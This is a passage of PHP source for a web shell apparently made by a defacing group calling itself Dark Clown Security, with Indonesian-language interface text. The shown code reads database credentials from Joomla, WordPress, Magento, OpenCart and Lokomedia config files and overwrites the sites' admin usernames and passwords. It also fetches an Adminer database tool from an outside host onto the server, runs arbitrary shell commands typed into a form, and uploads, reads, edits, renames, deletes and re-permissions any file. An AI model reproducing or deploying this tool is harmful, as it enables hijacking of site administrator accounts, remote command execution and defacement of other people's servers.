 $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
 $result = mysql_fetch_array($q);
 $id = $result['id'];
 $site = ambilkata($config,"sitename = '","'");
 $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
 echo "Config => ".$file_conf."<br>";
 echo "CMS => Joomla<br>";
 if($site == '') {
 echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
 } else {
 echo "Sitename => $site<br>";
 }
 if(!$update OR !$conn OR !$db) {
 echo "Status => <font color=red>".mysql_error()."</font><br><br>";
 } else {
 echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
 }
 mysql_close($conn);
 } elseif(preg_match("/WordPress/",$config)) {
 $dbhost = ambilkata($config,"DB_HOST', '","'");
 $dbuser = ambilkata($config,"DB_USER', '","'");
 $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
 $dbname = ambilkata($config,"DB_NAME', '","'");
 $dbprefix = ambilkata($config,"table_prefix  = '","'");
 $prefix = $dbprefix."users";
 $option = $dbprefix."options";
 $conn = mysql_connect($dbhost,$dbuser,$dbpass);
 $db = mysql_select_db($dbname);
 $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
 $result = mysql_fetch_array($q);
 $id = $result[ID];
 $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
 $result2 = mysql_fetch_array($q2);
 $target = $result2[option_value];
 if($target == '') {
 $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
 } else {
 $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
 }
 $update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
 echo "Config => ".$file_conf."<br>";
 echo "CMS => Wordpress<br>";
 echo $url_target;
 if(!$update OR !$conn OR !$db) {
 echo "Status => <font color=red>".mysql_error()."</font><br><br>";
 } else {
 echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
 }
 mysql_close($conn);
 } elseif(preg_match("/Magento|Mage_Core/",$config)) {
 $dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
 $dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
 $dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
 $dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
 $dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
 $prefix = $dbprefix."admin_user";
 $option = $dbprefix."core_config_data";
 $conn = mysql_connect($dbhost,$dbuser,$dbpass);
 $db = mysql_select_db($dbname);
 $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
 $result = mysql_fetch_array($q);
 $id = $result[user_id];
 $q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
 $result2 = mysql_fetch_array($q2);
 $target = $result2[value];
 if($target == '') {
 $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
 } else {
 $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
 }
 $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
 echo "Config => ".$file_conf."<br>";
 echo "CMS => Magento<br>";
 echo $url_target;
 if(!$update OR !$conn OR !$db) {
 echo "Status => <font color=red>".mysql_error()."</font><br><br>";
 } else {
 echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
 }
 mysql_close($conn);
 } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
 $dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
 $dbuser = ambilkata($config,"'DB_USERNAME', '","'");
 $dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
 $dbname = ambilkata($config,"'DB_DATABASE', '","'");
 $dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
 $prefix = $dbprefix."user";
 $conn = mysql_connect($dbhost,$dbuser,$dbpass);
 $db = mysql_select_db($dbname);
 $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
 $result = mysql_fetch_array($q);
 $id = $result[user_id];
 $target = ambilkata($config,"HTTP_SERVER', '","'");
 if($target == '') {
 $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
 } else {
 $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
 }
 $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
 echo "Config => ".$file_conf."<br>";
 echo "CMS => OpenCart<br>";
 echo $url_target;
 if(!$update OR !$conn OR !$db) {
 echo "Status => <font color=red>".mysql_error()."</font><br><br>";
 } else {
 echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
 }
 mysql_close($conn);
 } elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
 $dbhost = ambilkata($config,'server = "','"');
 $dbuser = ambilkata($config,'username = "','"');
 $dbpass = ambilkata($config,'password = "','"');
 $dbname = ambilkata($config,'database = "','"');
 $prefix = "users";
 $option = "identitas";
 $conn = mysql_connect($dbhost,$dbuser,$dbpass);
 $db = mysql_select_db($dbname);
 $q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
 $result = mysql_fetch_array($q);
 $target = $result[alamat_website];
 if($target == '') {
 $target2 = $result[url];
 $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
 if($target2 == '') {
 $url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
 } else {
 $cek_login3 = file_get_contents("$target2/adminweb/");
 $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
 if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
 $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
 } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
 $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
 } else {
 $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
 }
 }
 } else {
 $cek_login = file_get_contents("$target/adminweb/");
 $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
 if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
 $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
 } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
 $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
 } else {
 $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
 }
 }
 $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
 echo "Config => ".$file_conf."<br>";
 echo "CMS => Lokomedia<br>";
 if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
 echo $url_target2;
 } else {
 echo $url_target;
 }
 if(!$update OR !$conn OR !$db) {
 echo "Status => <font color=red>".mysql_error()."</font><br><br>";
 } else {
 echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
 }
 mysql_close($conn);
 }
 }
 }
 } else {
 echo "<center>
 <div class='card'>
  <div class='card-header'>
    <h3 style='color: black;'>🅰🆄🆃🅾 🅴🅳🅸🆃 🆄🆂🅴🆁 🅲🅾🅽🅵🅸🅶</h3>
  </div>
  <div class='card-body'>
    <blockquote class='blockquote mb-0'>
      <form method='post'>
 <font color='black'>DIR Config: <br>
 <div class='input-group flex-nowrap'>
  <div class='input-group-prepend'>
    <span class='input-group-text' id='addon-wrapping'><i class='fa fa-folder'></i></span>
  </div>
  <input type='text' size='50' name='config_dir' value='$dir' class='form-control' placeholder='Username' aria-label='Username' aria-describedby='addon-wrapping'>
</div>
 Set User & Pass: <br></font>
 <div class='input-group flex-nowrap'>
  <div class='input-group-prepend'>
    <span class='input-group-text' id='addon-wrapping'><i class='fa fa-user-secret'></i></span>
  </div>
  <input type='text' name='user_baru' value='Seterah lu' placeholder='user_baru' class='form-control' placeholder='Username' aria-label='Username' aria-describedby='addon-wrapping'>
</div>
<div class='input-group flex-nowrap'>
  <div class='input-group-prepend'>
    <span class='input-group-text' id='addon-wrapping'><i class='fa fa-lock'></i></span>
  </div>
  <input type='text' name='pass_baru'  value='Seterah lu' placeholder='pass_baru' class='form-control' placeholder='Username' aria-label='Username' aria-describedby='addon-wrapping'>
</div><br>
 <input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
 </form>
      <footer class='blockquote-footer'>NB: Tools ini work jika dijalankan di dalam folder <u>config</u><cite title='Source Title'>( ex: /home/user/public_html/nama_folder_config )</cite></footer>
    </blockquote>
  </div>
</div>
 ";
 }
 ?>
<?php
  } elseif($_GET['to'] == 'about') {
   ?>
   <tr>
   <td>
   <center>
   	<div class='card'>
  <div class='card-header'>
    <h5 style='color: black;'>ᗪ卂尺Ҝ 匚ㄥㄖ山几 丂乇匚ㄩ尺丨ㄒㄚ</h5>
  </div>
  <div class='card-body'>
    <blockquote class='blockquote mb-0'>
    	<img src="https://linkpicture.com/q/DarkClownSec.png" width="180" height="150">
      <p style="color: black;">Dark Clown Security adalah suatu komunitas yang berpacu dengan dunia defacing.</p>
      <p style="color: black;">Author: xMr.Cold - Mr.TenAr - ./XBoysX_003</p>
      <footer class='blockquote-footer'>Copyright &copy; <cite title='Source Title'>Dark Clown Security</cite></footer>
    </blockquote>
  </div>
</div>
   </center>
   </td>
   </tr>
   <?php
   } elseif($_GET['to'] == 'adminer') {
 $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
 function adminer($url, $isi) {
 $fp = fopen($isi, "w");
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $url);
 curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($ch, CURLOPT_FILE, $fp);
 return curl_exec($ch);
 curl_close($ch);
 fclose($fp);
 ob_flush();
 flush();
 }
 if(file_exists('adminer.php')) {
 echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
 } else {
 if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
 echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
 } else {
 echo "<center><font color=red>gagal buat file adminer</font></center>";
 }  
 
 }
 
 } elseif($_GET['to'] == 'cmd') {
 echo "<form method='post'>
 <font style='text-decoration: underline;'>".$user."@".$ip.": ~ $ </font>
 <input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
 </form>";
 if($_POST['do_cmd']) {
	echo "<pre>".exe($_POST['cmd'])."</pre>";
	}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="white">File Upload :</font> <input type="file" name="file" />
<input type="submit" value="Crotz" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo "<script type='text/javascript'>swal('Permission Change', 'Permission Berhasil Di Ubah' , 'success')</script>";
}else{
echo "<script type='text/javascript'>swal('Gagal', 'Permission Gagal Di Ubah' , 'error')</script>";
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo "<script type='text/javascript'>swal('Nama Berhasil Di Ubah', 'Ganti Nama Berhasil' , 'success')</script>";
}else{
echo "<script type='text/javascript'>swal('Gagal', 'Ganti Nama Gagal' , 'error')</script>";
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
Nama Baru : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Crotz" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo "<script type='text/javascript'>swal('Berhasil Edit File', 'Ter Edit' , 'success')</script>";
}else{
echo "<script type='text/javascript'>swal('Gagal Edit File', 'Edit Gagal' , 'error')</script>";
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo "<script type='text/javascript'>swal('Berhasil Di Hapus', 'Directory Terhapus' , 'success')</script>";
}else{
echo "<script type='text/javascript'>swal('Gagal Di Hapus', 'Directory Gagal Terhapus' , 'error')</script>";
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo "<script type='text/javascript'>swal('Berhasil Di Hapus', 'File Terhapus' , 'success')</script>";
}else{
echo "<script type='text/javascript'>swal('Gagal Di Hapus', 'File Gagal Dihapus' , 'error')</script>";
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</peller></center></td>
<td><center>Size</peller></center></td>
<td><center>Permission</peller></center></td>
<td><center>Modify</peller></center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="aqua">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="aqua">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Pilih</option>
<option value="delete">Hapus</option>
<option value="chmod">Chmod</option>
<option value="rename">Ganti Nama</option>
<option value="edit">Ubah</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<center><br/><h3 style="color: cyan;">Xai Syndicate Ft Dark Clown Security</h3></center>
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
</body>
</html>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
